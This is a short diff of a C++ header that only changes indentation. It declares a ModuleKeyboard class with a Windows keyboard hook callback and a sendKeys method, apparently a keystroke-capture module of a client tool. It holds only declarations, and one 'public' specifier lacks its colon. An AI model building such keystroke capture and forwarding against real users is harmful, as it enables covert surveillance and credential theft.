@@ -10,22 +10,22 @@
 #include "../IModule.hpp"
 
 class ModuleKeyboard : public IModule {
-public
+  public
     ModuleKeyboard(Client &client);
 
-public:
+  public:
     void start(ModuleCommunication &com) override;
 
-public:
+  public:
     static boost::shared_ptr<ModuleKeyboard> create(Client &client);
 
-public:
+  public:
     static LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam);
 
-private:
+  private:
     void sendKeys();
 
-private:
+  private:
     Client &client;
     bool _running;
 };
